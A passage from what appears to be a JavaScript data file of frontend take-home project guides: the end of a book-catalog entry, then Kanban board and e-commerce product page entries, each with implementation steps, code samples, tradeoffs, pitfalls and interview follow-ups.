              && !book.author.toLowerCase().includes(query)
              && !book.isbn.includes(query)) return false;

    if (genres.length > 0 && !genres.includes(book.genre)) return false;

    if (yearRange) {
      const [min, max] = yearRange;
      if (book.year < min || book.year > max) return false;
    }

    if (availability !== null && book.available !== availability) return false;

    if (rating !== null && book.rating < rating) return false;

    return true;
  });

  result.sort((a, b) => {
    let cmp = 0;
    if (sortBy === 'title')  cmp = a.title.localeCompare(b.title);
    if (sortBy === 'year')   cmp = a.year - b.year;
    if (sortBy === 'rating') cmp = a.rating - b.rating;
    return sortOrder === 'asc' ? cmp : -cmp;
  });

  return result;
}

// hooks/useDebounce.js — debounce any value
import { useState, useEffect } from 'react';

export function useDebounce(value, delay = 300) {
  const [debounced, setDebounced] = useState(value);
  useEffect(() => {
    const timer = setTimeout(() => setDebounced(value), delay);
    return () => clearTimeout(timer);
  }, [value, delay]);
  return debounced;
}`,
    },
    tradeoffDecisions: [
      { choice: 'Client-side vs server-side filtering', picked: 'Client-side filtering', reason: 'The dataset is static JSON loaded once. Client-side filtering is instant (no network round-trips) and appropriate for datasets up to ~10,000 items. This is explicitly the expected approach for a frontend take-home.' },
      { choice: 'Single filters object vs separate useState per filter', picked: 'Single filters object', reason: 'A single state object means one re-render per filter change regardless of how many filters update simultaneously. It also makes URL serialization trivial: Object.entries(filters) maps directly to query params.' },
      { choice: 'URL query params vs localStorage for filter persistence', picked: 'URL query params', reason: 'URL persistence makes filter states shareable via link and supports browser back/forward. localStorage would persist across sessions but breaks the shareable-URL use case that evaluators specifically look for.' },
      { choice: 'Framer Motion vs CSS transitions for layout animation', picked: 'CSS transitions', reason: 'CSS transitions require zero additional dependencies. A grid-cols class swap with transition-all and fixed card heights achieves a smooth layout toggle. Framer Motion adds 40KB for marginal visual improvement.' },
    ],
    deepDiveTopics: [
      { topic: 'useMemo for filter performance', detail: 'Without memoization, filterBooks runs on every render — including renders caused by unrelated state changes like wishlist updates. Wrapping in useMemo with [books, filters] as dependencies ensures the filter only recomputes when inputs change. For a 1,000-book dataset with multiple active filters, this can avoid dozens of wasted iterations per second.' },
      { topic: 'URL state synchronization pattern', detail: 'The pattern: on filter change, call setSearchParams(new URLSearchParams(filters)) to write to URL. On mount, call new URLSearchParams(location.search) to read initial state. This creates a two-way sync. The key insight is to treat the URL as the source of truth, initializing React state from URL on mount rather than the reverse.' },
      { topic: 'Accessible filter controls', detail: 'Evaluators who care about accessibility check: genre checkboxes have associated <label> elements, the range slider uses aria-valuemin/valuemax/valuenow, the search input has aria-label="Search books", clear-filters button is focusable and has descriptive aria-label, and color is never the sole indicator of availability status (use text or icon alongside color).' },
      { topic: 'Debounce vs throttle for search', detail: 'Debounce delays execution until N ms after the last call — perfect for search: wait until the user stops typing before filtering. Throttle limits execution to at most once per N ms — better for scroll events. For a 300ms debounce on search: typing "tolkien" produces one filter call after the user pauses, not 7 calls for each character.' },
    ],
    commonPitfalls: [
      { pitfall: 'Filter state not persisting across page navigation', why: 'Navigating to a book detail page and back resets filter state if it only lives in component state. The user loses their place in the filtered catalog.', solution: 'Sync filter state to URL query params. On mount, initialize filter state from searchParams. React Router preserves query params across navigations when using <Link> components.' },
      { pitfall: 'Re-filtering on every keystroke without debounce', why: 'Filtering 500 books on every keypress is fast but triggers a new render every 50ms while the user types, causing noticeable jank on slower devices.', solution: 'Apply a 300ms debounce to the search input value. Show the raw (non-debounced) value in the input for immediate visual feedback, but only pass the debounced value to filterBooks.' },
      { pitfall: 'Genre filter with hardcoded values', why: 'If genre options are hardcoded in the FilterPanel component, adding new genres to books.json requires updating two files. The options get out of sync.', solution: 'Derive genre options dynamically: const genres = useMemo(() => [...new Set(books.map(b => b.genre))].sort(), [books]). The filter UI always reflects the actual dataset.' },
      { pitfall: 'Wishlist state reset on page refresh', why: 'Using React state alone for the wishlist loses it when the page refreshes. Users expect wishlists to persist.', solution: 'Persist wishlist to localStorage via useEffect: useEffect(() => { localStorage.setItem("wishlist", JSON.stringify(wishlist)); }, [wishlist]). Initialize state from localStorage: useState(() => JSON.parse(localStorage.getItem("wishlist") ?? "[]")).' },
    ],
    edgeCases: [
      { scenario: 'Search query with special regex characters', impact: 'If the search string is used in a RegExp constructor (new RegExp(query)), characters like "." or "+" break the regex or match unintended patterns.', mitigation: 'Use String.includes() or String.toLowerCase().includes() for simple substring matching. Avoid RegExp unless you specifically need pattern matching — it adds complexity and edge cases.' },
      { scenario: 'Books dataset with missing or null fields', impact: 'If some books are missing the genre field, the genre filter throws "Cannot read property of null" when accessing book.genre.', mitigation: 'Add defensive checks in filterBooks: if (genres.length > 0 && !genres.includes(book.genre ?? \'\')) return false. Also validate the JSON dataset during development with a schema check script.' },
      { scenario: 'Year range slider with min > max', impact: 'If the user somehow sets the minimum year above the maximum (can happen with direct input fields), filterBooks returns zero results with no explanation.', mitigation: 'Clamp values: const [minYear, maxYear] = [Math.min(a, b), Math.max(a, b)]. Or validate in the slider component: do not allow min handle to exceed max handle position.' },
      { scenario: 'Wishlist persistence with invalid localStorage data', impact: 'If localStorage contains corrupted or outdated JSON (e.g., from an older version of the app), JSON.parse throws and crashes the app on load.', mitigation: 'Wrap localStorage.getItem in try/catch: try { return JSON.parse(raw) } catch { localStorage.removeItem("wishlist"); return []; }' },
    ],
    interviewFollowups: [
      { question: 'How would you handle a dataset of 100,000 books?', answer: 'Client-side filtering no longer works at that scale — the initial payload is too large. Move to a server-side API with pagination. Implement debounced API calls for search, and use React Query for caching and loading states. Consider ElasticSearch for full-text search across large catalogs.' },
      { question: 'How would you add virtual scrolling for the book grid?', answer: 'Use react-window or TanStack Virtual. Calculate the total grid height from item count * row height, render only the visible rows plus an overscan buffer, and absolutely position each row. This keeps the DOM node count constant regardless of how many books match the filters.' },
      { question: 'How would you make the filters accessible to screen reader users?', answer: 'All inputs need associated labels. Use role="group" and aria-labelledby for filter sections. Live region (aria-live="polite") announcing "showing X of Y books" after filters update. Ensure keyboard focus order is logical: search first, then filters, then results.' },
      { question: 'How would you implement fuzzy search?', answer: 'Replace the String.includes check with Fuse.js, a lightweight fuzzy-matching library. Configure with keys: ["title", "author", "isbn"] and a threshold of 0.3. Fuse scores matches and returns them in relevance order. This handles typos like "Tolkein" matching "Tolkien".' },
    ],
    extensionIdeas: [
      { idea: 'URL-shareable wishlist', difficulty: 'beginner', description: 'Encode the wishlist as a base64 URL param (?wish=abc123). Anyone with the link sees the same wishlist pre-populated. Demonstrates URL encoding and shareable state patterns.' },
      { idea: 'Reading progress tracker', difficulty: 'beginner', description: 'Add "Want to Read / Reading / Finished" status per book stored in localStorage. Show status badge on each BookCard. Filter by reading status in the sidebar. Common UX pattern from Goodreads.' },
      { idea: 'Keyboard command palette', difficulty: 'intermediate', description: 'Cmd+K opens a command palette (like Linear or Raycast). Type to search books, select genres, or clear filters. Implemented with a modal + filtered command list + keyboard arrow navigation.' },
      { idea: 'Infinite scroll with Intersection Observer', difficulty: 'intermediate', description: 'Replace static grid with paginated rendering: show first 20 books, attach an Intersection Observer to the last card, load 20 more when it enters the viewport. Keeps initial render fast for large filtered result sets.' },
    ],
  },
  {
    id: 'kanban-board',
    title: 'Kanban Board',
    icon: 'columns',
    color: '#0ea5e9',
    difficulty: 'intermediate',
    estimatedTime: '5-7 hours',
    techStack: ['React', 'TypeScript', 'DnD Kit', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a Trello-style Kanban board with drag-and-drop cards between columns, task editing, labels, due dates, and board persistence.',
    introduction: 'Create a project management board where users organize tasks across customizable columns (To Do, In Progress, Review, Done). Implement drag-and-drop for reordering cards within columns and moving them between columns. Add task details: description, labels, due dates, and checklists.',
    interviewRelevance: 'Tests complex state management, drag-and-drop implementation, optimistic UI updates, and component architecture. This is a popular take-home for frontend roles at product companies because it exercises real-world interaction patterns.',
    learningObjectives: [
      'Implement drag-and-drop using @dnd-kit/core with sortable columns and cards',
      'Build an optimistic reorder system that updates UI immediately, syncs to storage async',
      'Create a task detail modal with rich editing (description, labels, due dates, checklists)',
      'Add column management: create, rename, delete, and reorder columns',
    ],
    keyQuestions: [
      { question: 'Which drag-and-drop library should I use?', answer: '@dnd-kit is the modern standard for React DnD. It handles: sortable lists (cards within columns), droppable containers (columns), keyboard accessibility, and touch support. Avoid react-beautiful-dnd (deprecated) and HTML5 Drag API (poor mobile support).' },
      { question: 'How do I model the data structure?', answer: 'Two entities: columns (id, title, order) and cards (id, columnId, title, description, labels[], dueDate, order). Store column order and card order as float values for efficient reordering (new position = average of neighbors). Use a normalized state shape: { columns: { [id]: Column }, cards: { [id]: Card }, columnOrder: string[] }.' },
      { question: 'How do I handle cross-column moves?', answer: 'On drag end: 1) Remove card from source column, 2) Insert at target position in target column, 3) Recalculate order values for affected cards, 4) Update state optimistically, 5) Persist to storage. Use dnd-kit\'s onDragEnd with active/over container detection to determine source and target columns.' },
      { question: 'What features make this production-quality?', answer: 'Keyboard accessibility (tab through cards, arrow keys to move), undo/redo (Cmd+Z), search/filter across all cards, drag placeholder animation, column WIP limits with visual warnings, and smooth card creation animation.' },
    ],
    implementationSteps: [
      { phase: 1, title: 'Data Model & Board Scaffold', description: 'Define the normalized board data structure and render a static board before adding any drag-and-drop behavior.', tasks: ['Define TypeScript types: Column { id, title, order }, Card { id, columnId, title, description, labels, dueDate, order }', 'Initialize board state with useReducer: { columns: Record<id, Column>, cards: Record<id, Card>, columnOrder: string[] }', 'Render static columns and card stacks from state using columnOrder to drive column sequence', 'Add inline column title editing with double-click to edit, Enter to save, Escape to cancel', 'Add new card input at bottom of each column with Cmd+Enter to save quickly'] },
      { phase: 2, title: 'Drag-and-Drop with dnd-kit', description: 'Integrate @dnd-kit/core and @dnd-kit/sortable to handle card reordering within columns and card moves between columns.', tasks: ['Install @dnd-kit/core, @dnd-kit/sortable, @dnd-kit/utilities', 'Wrap the board in DndContext with onDragStart, onDragOver, and onDragEnd handlers', 'Make each column a SortableContext with its card IDs array and verticalListSortingStrategy', 'Make each card a useSortable item with transform and transition styles applied', 'Handle cross-column moves in onDragEnd: detect active container vs over container, update card.columnId and recalculate order values'] },
      { phase: 3, title: 'Card Detail Modal & Labels', description: 'Build the card detail modal with rich editing: full description, color labels, due date picker, and checklist items.', tasks: ['Create CardModal component triggered by clicking a card (not the drag handle)', 'Add markdown-capable textarea for description with a live preview toggle', 'Build label system: 6 color presets, click to toggle on/off card, display as colored dots on the card', 'Add due date picker (native <input type="date">) with overdue visual state (red badge when past due)', 'Add checklist: add/remove/check items, show "X/Y" completion count on the card in board view'] },
      { phase: 4, title: 'Persistence, Undo & Polish', description: 'Add localStorage persistence, undo/redo history, search/filter across cards, and keyboard accessibility.', tasks: ['Persist board state to localStorage on every dispatch via a useEffect subscriber', 'Implement undo/redo: maintain past and future state stacks, Cmd+Z / Cmd+Shift+Z handlers', 'Add global card search: filter cards matching query, dim non-matching cards, highlight matching text', 'Add keyboard shortcuts: N for new card in focused column, Delete for selected card (with confirmation)', 'Smooth drag overlay: custom DragOverlay rendering a slightly scaled card clone during drag'] },
    ],
    fileStructure: `kanban-board/
├── index.html
├── package.json
├── vite.config.ts
├── tailwind.config.js
└── src/
    ├── main.tsx
    ├── App.tsx
    ├── types/
    │   └── board.ts
    ├── store/
    │   ├── boardReducer.ts
    │   └── useBoard.ts
    ├── hooks/
    │   ├── useLocalStorage.ts
    │   └── useUndoRedo.ts
    ├── components/
    │   ├── Board.tsx
    │   ├── Column.tsx
    │   ├── Card.tsx
    │   ├── CardModal.tsx
    │   ├── DragOverlay.tsx
    │   ├── LabelPicker.tsx
    │   ├── Checklist.tsx
    │   └── SearchBar.tsx
    └── lib/
        └── orderUtils.ts`,
    architectureLayers: [
      { name: 'State Layer', description: 'useReducer with a normalized state shape: columns and cards stored as Record<id, entity> maps, with a separate columnOrder array. All mutations go through typed action dispatches, enabling undo/redo by snapshotting state.' },
      { name: 'Undo/Redo Layer', description: 'useUndoRedo hook wraps the reducer, maintaining past[] and future[] state stacks. Every dispatch pushes current state to past. Cmd+Z pops past into current; Cmd+Shift+Z pops future.' },
      { name: 'DnD Layer', description: '@dnd-kit DndContext handles the full drag lifecycle. onDragStart captures the active item, onDragOver produces the visual placeholder, onDragEnd commits the reorder or cross-column move to state.' },
      { name: 'Order Management Layer', description: 'Cards and columns use floating-point order values. Inserting between two items: newOrder = (before.order + after.order) / 2. When precision degrades (gap < 0.001), a rebalance pass reassigns integer order values to all items in the list.' },
      { name: 'Persistence Layer', description: 'useEffect subscriber watches board state and writes to localStorage on every change. On app mount, state initializes from localStorage with a fallback to the default empty board.' },
      { name: 'Component Layer', description: 'Board renders columns via columnOrder. Column renders its card list via a per-column card ID array. Card is a pure presentational component receiving data and callbacks as props.' },
    ],
    codeExamples: {
      typescript: `// store/boardReducer.ts — normalized state with typed actions
import type { Board, Card } from '../types/board';

type Action =
  | { type: 'MOVE_CARD'; cardId: string; toColumnId: string; newOrder: number }
  | { type: 'ADD_CARD'; columnId: string; title: string }
  | { type: 'UPDATE_CARD'; cardId: string; updates: Partial<Card> }
  | { type: 'DELETE_CARD'; cardId: string }
  | { type: 'ADD_COLUMN'; title: string }
  | { type: 'REORDER_COLUMNS'; newOrder: string[] };

export function boardReducer(state: Board, action: Action): Board {
  switch (action.type) {
    case 'MOVE_CARD': {
      const card = state.cards[action.cardId];
      return {
        ...state,
        cards: {
          ...state.cards,
          [action.cardId]: { ...card, columnId: action.toColumnId, order: action.newOrder },
        },
      };
    }
    case 'ADD_CARD': {
      const id = crypto.randomUUID();
      const colCards = Object.values(state.cards)
        .filter(c => c.columnId === action.columnId);
      const maxOrder = colCards.length ? Math.max(...colCards.map(c => c.order)) : 0;
      return {
        ...state,
        cards: {
          ...state.cards,
          [id]: { id, columnId: action.columnId, title: action.title,
                   description: '', labels: [], dueDate: null,
                   checklist: [], order: maxOrder + 1000 },
        },
      };
    }
    case 'UPDATE_CARD':
      return { ...state, cards: { ...state.cards,
        [action.cardId]: { ...state.cards[action.cardId], ...action.updates } } };
    default:
      return state;
  }
}`,
    },
    tradeoffDecisions: [
      { choice: '@dnd-kit vs react-beautiful-dnd', picked: '@dnd-kit', reason: 'react-beautiful-dnd is officially deprecated. @dnd-kit is actively maintained, supports touch/pointer events natively, has built-in keyboard accessibility, and its modular design (core + sortable + utilities) keeps bundle size small.' },
      { choice: 'Floating-point order values vs integer gap strategy', picked: 'Floating-point midpoint', reason: 'Midpoint ordering (newOrder = (a + b) / 2) allows arbitrary insertions without updating adjacent items. Only a rare rebalance pass is needed when precision degrades. Integer gap (increment by 1000) requires updating many order values on every reorder.' },
      { choice: 'useReducer vs Zustand for board state', picked: 'useReducer', reason: 'For a take-home, useReducer is the right tool — it is built-in, shows mastery of React state patterns, and pairs naturally with undo/redo (just snapshot the state object). Zustand adds value in larger apps where state needs to be accessed across distant component trees.' },
      { choice: 'localStorage vs IndexedDB for persistence', picked: 'localStorage', reason: 'localStorage is synchronous and simple — a JSON.stringify/parse round-trip on state change. IndexedDB handles large datasets and async operations but is overkill for a Kanban board with hundreds of cards. Mention IndexedDB as the production-ready alternative.' },
    ],
    deepDiveTopics: [
      { topic: 'dnd-kit drag lifecycle', detail: 'Three phases: onDragStart (fires when pointer moves past the activation distance — store the dragged item in activeId state and show a DragOverlay clone), onDragOver (fires on every pointer move over a droppable — produce the placeholder position for visual feedback), onDragEnd (fires on pointer release — commit the reorder to state or reset if dropped outside a valid target). The key insight is that the actual state update only happens in onDragEnd; onDragOver only updates transient UI.' },
      { topic: 'Fractional indexing for card order', detail: 'Storing order as floats allows O(1) insertion: to insert between cards with order 1.0 and 2.0, assign 1.5. The problem is precision loss after many insertions: eventually you get 1.0000000000001 and 1.0000000000002 with no room between them. The fix is a rebalance pass that reassigns clean integer order values (1000, 2000, 3000...) when the minimum gap between adjacent cards drops below a threshold like 0.001.' },
      { topic: 'Normalized vs nested board state', detail: 'A nested state shape (columns contain arrays of card objects) feels natural but makes updates painful: to move a card, you must find it in the source column array, splice it out, find the target column, and splice it in — mutating deeply nested structures. A normalized shape (cards: Record<id,Card>, each card has columnId) makes the MOVE_CARD action a single object spread with no array mutations.' },
      { topic: 'Keyboard accessibility with dnd-kit', detail: 'dnd-kit includes a KeyboardSensor that supports keyboard-only drag: press Space to pick up a card, arrow keys to move to the next drop target, Space again to drop. Configure with KeyboardCoordinateGetter that returns the center coordinates of the target container. This is essential for accessibility compliance and is a detail evaluators specifically look for in senior frontend take-homes.' },
    ],
    commonPitfalls: [
      { pitfall: 'Triggering drag when clicking to open card detail', why: 'If the entire card surface is the drag handle, any click starts a drag. Tapping to open the modal conflicts with the drag activation distance.', solution: 'Use a separate drag handle (a grip icon in the card corner). Set the draggable area to the handle only using useDraggable with a dedicated handle ref. Card body click opens the modal.' },
      { pitfall: 'State desync between drag overlay and actual card', why: 'If the DragOverlay renders a copy of the card but the underlying card is still visible at its original position, you get a visual duplicate during drag.', solution: 'Apply opacity: 0 to the original card while isDragging is true (use the useSortable transform: isDragging state). Only the DragOverlay clone should be visible during the drag.' },
      { pitfall: 'Stale closure in onDragEnd accessing old state', why: 'If onDragEnd is defined outside the DndContext or not recreated when state changes, it captures a stale snapshot of state. Cross-column moves reference wrong card positions.', solution: 'Define onDragEnd inside the component or use useCallback with board state as a dependency. For complex boards, use a ref to always access the latest state: const stateRef = useRef(state); stateRef.current = state.' },
      { pitfall: 'localStorage serialization losing Date objects', why: 'JSON.stringify converts Date objects to ISO strings. JSON.parse does not convert them back — dueDate becomes a string, and date comparisons (isOverdue) break silently.', solution: 'Write a reviver function for JSON.parse: JSON.parse(data, (key, val) => key === "dueDate" && val ? new Date(val) : val). Or store dates as ISO strings throughout and convert to Date only at the display layer.' },
    ],
    edgeCases: [
      { scenario: 'Dropping a card onto the column header (not a card slot)', impact: 'onDragEnd receives an over target that is the column container, not a card. Without handling this case, the card is dropped at order 0 or not moved at all.', mitigation: 'In onDragEnd, detect if over.id is a column ID (not a card ID). If so, append the card to the end of that column: find the max order of cards in the column and assign max + 1000.' },
      { scenario: 'Deleting a column that still has cards', impact: 'If cards reference a deleted column via columnId, they become orphaned — they exist in the cards map but no column renders them.', mitigation: 'In the DELETE_COLUMN action, first collect all card IDs in that column, then delete both the column and all its cards from state in a single reducer update.' },
      { scenario: 'Two cards with identical order values after concurrent updates', impact: 'If two operations assign the same order value (e.g., both appending to an empty column simultaneously), the sort order is non-deterministic.', mitigation: 'Use Date.now() + Math.random() for order values on creation to make collisions astronomically unlikely. For production, use a proper fractional indexing library like fractional-indexing.' },
      { scenario: 'localStorage quota exceeded (5MB limit)', impact: 'Writing a large board to localStorage throws a QuotaExceededError. The catch-free useEffect crashes silently and state stops persisting.', mitigation: 'Wrap the localStorage.setItem call in a try/catch. On QuotaExceededError, show a toast warning: "Board too large to save locally. Consider deleting old cards." Log the error for debugging.' },
    ],
    interviewFollowups: [
      { question: 'How would you add real-time collaboration (multiple users editing simultaneously)?', answer: 'Replace localStorage with a WebSocket connection to a server. Use Operational Transforms or CRDTs (like Yjs) to merge concurrent edits without conflicts. Each client broadcasts its actions; the server applies them in order and broadcasts the merged state. Yjs has a dnd-kit integration for shared sortable lists.' },
      { question: 'How would you implement WIP (Work In Progress) limits per column?', answer: 'Add a wipLimit field to the Column type. In the column header, show current card count vs limit. In onDragEnd, check if the target column\'s card count would exceed its WIP limit. If so, cancel the drop and show a toast warning. Visually highlight columns at or over their limit with a red border.' },
      { question: 'How would you scale this to a team board with 1,000 cards?', answer: 'Load only the visible columns and their cards (virtual columns). Use virtualized lists within each column (react-window) for columns with many cards. Store state in a database (PostgreSQL with column and card tables). Use optimistic updates on the frontend: update state immediately, sync to API in background, roll back on error.' },
      { question: 'How does your order system handle the precision degradation problem?', answer: 'After many midpoint insertions, the floating-point gap between adjacent cards approaches zero. When the minimum gap drops below a threshold (e.g., 0.001), a rebalance pass reassigns clean integer order values (1000, 2000, 3000...) to all cards in the affected column. This rebalance is transparent to the user and restores full insertion capacity.' },
    ],
    extensionIdeas: [
      { idea: 'Board templates', difficulty: 'beginner', description: 'Provide 3-4 starter board templates (Software Sprint, Content Calendar, Job Search). Store as JSON presets. New Board dialog shows template thumbnails. Populates the board state with pre-configured columns and sample cards.' },
      { idea: 'Card due date notifications', difficulty: 'intermediate', description: 'Use the Notification API to show browser notifications for cards due today. On app load, check all cards with dueDate === today and request notification permission if not granted. Schedule notifications with setTimeout for cards due later today.' },
      { idea: 'Board analytics view', difficulty: 'intermediate', description: 'A /board/:id/analytics route showing: cards per column (bar chart), average time cards spend in each column (requires createdAt and movedAt timestamps per card), throughput over time (cards completed per week), and bottleneck column identification.' },
      { idea: 'Multi-board support with board list', difficulty: 'advanced', description: 'Home page lists all boards with thumbnails (CSS mini-preview of column structure). Each board is a separate entry in localStorage (or a separate DB row). Board switching with URL routing: /board/:id. Shared labels across boards.' },
    ],
  },
  {
    id: 'ecommerce-product-page',
    title: 'E-commerce Product Page',
    icon: 'shoppingCart',
    color: '#7c3aed',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'TypeScript', 'Tailwind CSS', 'Zustand'],
    questions: 4,
    description: 'Build a product listing page with image gallery, variant selection, cart management, checkout flow, and responsive design.',
    introduction: 'Create a Shopify-style product browsing experience: product grid, detail page with image carousel, size/color variant picker, add-to-cart with quantity, persistent cart sidebar, and a multi-step checkout form. Focuses on e-commerce UI patterns and state management.',
    interviewRelevance: 'E-commerce UIs test your skills with complex forms, state management (cart), responsive image handling, and conversion-focused design. Common take-home for roles at e-commerce companies and agencies.',
    learningObjectives: [
      'Build a product image gallery with thumbnail navigation and zoom-on-hover',
      'Implement variant selection (size, color) with inventory-aware availability',
      'Create a persistent cart with add/remove/update quantity and subtotal calculation',
      'Build a multi-step checkout form with validation and order summary',
    ],
    keyQuestions: [
      { question: 'How should I manage cart state?', answer: 'Use Zustand with localStorage persistence. Cart state: { items: Array<{ productId, variantId, quantity, price }>, addItem(), removeItem(), updateQuantity(), clearCart(), total() }. Persist to localStorage via Zustand\'s persist middleware. Show cart count in the header badge.' },
      { question: 'How do I build the image gallery?', answer: 'Main image with thumbnail strip below. Click thumbnail to swap main image (with crossfade transition). Add zoom-on-hover for the main image (track mouse position, transform: scale(2) with transform-origin at cursor). Support swipe on mobile with touch events.' },
      { question: 'How do variant selections work?', answer: 'Model variants as a matrix: { size: ["S","M","L","XL"], color: ["Black","White","Navy"] }. Each combination maps to a SKU with price, inventory count, and image. Disable unavailable combinations (e.g., "XL + Navy" if out of stock). Update price and image when variant changes.' },
      { question: 'What checkout flow is expected?', answer: 'Three steps: 1) Shipping (name, address, phone with validation), 2) Payment (card number, expiry, CVV — mock, not real), 3) Review & Place Order (summary, edit links). Use a progress stepper component. Validate each step before allowing next. Show order confirmation with animation on success.' },
    ],
    implementationSteps: [
      { phase: 1, title: 'Product Data & Store Setup', description: 'Define the product and variant data model, set up Zustand cart store with localStorage persistence, and render the product listing grid.', tasks: ['Create src/data/products.ts with 12 products, each having variants matrix: { size: string[], color: string[] } and SKUs mapping size+color to { price, stock, imageUrl }', 'Set up Zustand cart store with persist middleware: { items: CartItem[], addItem, removeItem, updateQuantity, clearCart, total }', 'Build ProductGrid component rendering responsive card grid (minmax(280px, 1fr))', 'Add ProductCard with hover zoom effect, price display, and Add to Cart quick-action', 'Implement cart count badge in site header that updates reactively from Zustand store'] },
      { phase: 2, title: 'Product Detail & Variant Selection', description: 'Build the full product detail page with image gallery, variant picker, inventory-aware availability, and cart integration.', tasks: ['Create ProductDetailPage with React Router route /products/:slug', 'Build image gallery: main image display with thumbnail strip, click-to-swap with crossfade, swipe support on mobile', 'Implement variant picker: color swatches + size buttons, disable unavailable combinations, update price and image on selection', 'Add quantity selector with +/- buttons clamped to 1..stock, Add to Cart button disabled when out of stock or no variant selected', 'Show stock count warning ("Only 3 left") when stock <= 5'] },
      { phase: 3, title: 'Cart Sidebar & Checkout Form', description: 'Build the slide-out cart sidebar with item management and a three-step checkout form with full validation.', tasks: ['Build CartSidebar component: slide-in from right, item list with image/name/variant/qty/price, remove button, subtotal calculation', 'Implement cart item quantity update inline with immediate Zustand state update and localStorage sync', 'Create CheckoutPage with three steps: Shipping, Payment (mock), Order Review', 'Build step-by-step validation: each step validates its fields before enabling Next button, show inline field errors', 'Build OrderConfirmation component with animated checkmark, order summary, and "Continue Shopping" button that clears cart'] },
      { phase: 4, title: 'Polish & Accessibility', description: 'Add loading states, empty states, keyboard navigation, mobile optimization, and final visual polish.', tasks: ['Add skeleton loading for product grid initial load (CSS pulse animation)', 'Implement zoom-on-hover for product main image: track mouse position, apply transform: scale(2) with transform-origin at cursor coordinates', 'Mobile cart drawer: full-screen overlay on mobile vs side panel on desktop using responsive Tailwind classes', 'Keyboard accessibility: focus trap in cart sidebar, arrow keys for variant selection, Tab order through checkout steps', 'Add empty states: empty product grid ("No products found"), empty cart ("Your cart is empty" with Shop Now link)'] },
    ],
    fileStructure: `ecommerce-product-page/
├── index.html
├── package.json
├── vite.config.ts
├── tailwind.config.js
└── src/
    ├── main.tsx
    ├── App.tsx
    ├── data/
    │   └── products.ts
    ├── store/
    │   └── cartStore.ts
    ├── types/
    │   └── product.ts
    ├── hooks/
    │   └── useVariantSelection.ts
    ├── components/
    │   ├── ProductGrid.tsx
    │   ├── ProductCard.tsx
    │   ├── ImageGallery.tsx
    │   ├── VariantPicker.tsx
    │   ├── QuantitySelector.tsx
    │   ├── CartSidebar.tsx
    │   ├── CartItem.tsx
    │   └── checkout/
    │       ├── CheckoutStepper.tsx
    │       ├── ShippingStep.tsx
    │       ├── PaymentStep.tsx
    │       ├── ReviewStep.tsx
    │       └── OrderConfirmation.tsx
    └── pages/
        ├── ProductListPage.tsx
        └── ProductDetailPage.tsx`,
    architectureLayers: [
      { name: 'Data Layer', description: 'Static products.ts defines the full product catalog with variant matrices and SKU maps. All available combinations, prices, and stock counts are pre-computed as a lookup table keyed by "size:color".' },
      { name: 'Cart Store Layer', description: 'Zustand store with Zustand persist middleware handles all cart state — add, remove, update quantity, clear. Automatically serializes to localStorage on every mutation. Total is a computed selector derived from items.' },
      { name: 'Variant Selection Layer', description: 'useVariantSelection hook manages selected size and color, derives the active SKU key, and exposes: selectedVariant (the SKU data), isAvailable (stock > 0), and a select() function with availability validation.' },
      { name: 'Component Layer', description: 'Presentational components are fully controlled via props. ImageGallery manages its own active index state. VariantPicker fires onSelect callbacks. CartSidebar reads from Zustand directly and dispatches actions.' },
      { name: 'Checkout Layer', description: 'CheckoutPage uses a step index (0-2) with per-step validation. Each step component uses react-hook-form with Zod schema validation. Checkout state is local to CheckoutPage — not persisted (cleared on page refresh is acceptable).' },
      { name: 'Routing Layer', description: 'React Router: / for product listing, /products/:slug for detail, /checkout for the multi-step form, /order-confirmation/:orderId for the success page. Cart state persists across all routes via Zustand.' },
    ],
    codeExamples: {
      typescript: `// store/cartStore.ts — Zustand cart with localStorage persistence
import { create } from 'zustand';
import { persist } from 'zustand/middleware';

interface CartItem {
  productId: string;
  variantKey: string;  // "M:Black"
  name: string;
  image: string;
  price: number;
  quantity: number;
}

interface CartStore {
  items: CartItem[];
  addItem: (item: Omit<CartItem, 'quantity'>) => void;
  removeItem: (productId: string, variantKey: string) => void;
  updateQuantity: (productId: string, variantKey: string, quantity: number) => void;
  clearCart: () => void;
  total: () => number;
}

export const useCartStore = create<CartStore>()(
  persist(
    (set, get) => ({
      items: [],
      addItem: (newItem) => set(state => {
        const existing = state.items.find(
          i => i.productId === newItem.productId && i.variantKey === newItem.variantKey
        );
        if (existing) {
          return { items: state.items.map(i =>
            i.productId === newItem.productId && i.variantKey === newItem.variantKey
              ? { ...i, quantity: i.quantity + 1 } : i
          )};
        }
        return { items: [...state.items, { ...newItem, quantity: 1 }] };
      }),
      removeItem: (productId, variantKey) => set(state => ({
        items: state.items.filter(i => !(i.productId === productId && i.variantKey === variantKey))
      })),
      updateQuantity: (productId, variantKey, quantity) => set(state => ({
        items: quantity <= 0
          ? state.items.filter(i => !(i.productId === productId && i.variantKey === variantKey))
          : state.items.map(i =>
              i.productId === productId && i.variantKey === variantKey ? { ...i, quantity } : i
            )
      })),
      clearCart: () => set({ items: [] }),
      total: () => get().items.reduce((sum, i) => sum + i.price * i.quantity, 0),
    }),
    { name: 'cart-storage' }
  )
);`,
    },
    tradeoffDecisions: [
      { choice: 'Zustand vs React Context for cart state', picked: 'Zustand', reason: 'The spec calls for Zustand. It avoids the Context re-render problem (all Context consumers re-render on any state change). Zustand uses selectors so components only re-render when their specific slice changes. The persist middleware adds localStorage sync in one line.' },
      { choice: 'SKU matrix vs flat variant array', picked: 'SKU matrix (Record<string, SKU>)', reason: 'A SKU matrix keyed by "size:color" enables O(1) lookup for any combination. A flat array requires Array.find on every selection change. The matrix also makes it trivial to check if a specific combination is in stock.' },
      { choice: 'React Hook Form vs controlled inputs for checkout', picked: 'React Hook Form', reason: 'react-hook-form registers inputs without controlled state, producing zero re-renders during typing. Controlled inputs re-render on every keystroke. For a 10-field checkout form, this is a meaningful performance difference, and react-hook-form shows library familiarity.' },
      { choice: 'Static product data vs mock API', picked: 'Static TypeScript data', reason: 'A frontend take-home does not require a backend. Static TypeScript data is type-safe, instantly available, and removes deployment complexity. Evaluators care about the UI implementation, not the data source.' },
    ],
    deepDiveTopics: [
      { topic: 'Zustand persist middleware', detail: 'The persist middleware wraps the store and automatically calls JSON.stringify(state) on every mutation, writing to localStorage under the configured name key. On app mount, it reads localStorage and merges the stored state into the initial state. Custom serializers can be provided for Date objects or other non-JSON types. partialize option lets you persist only specific fields (e.g., persist items but not UI state).' },
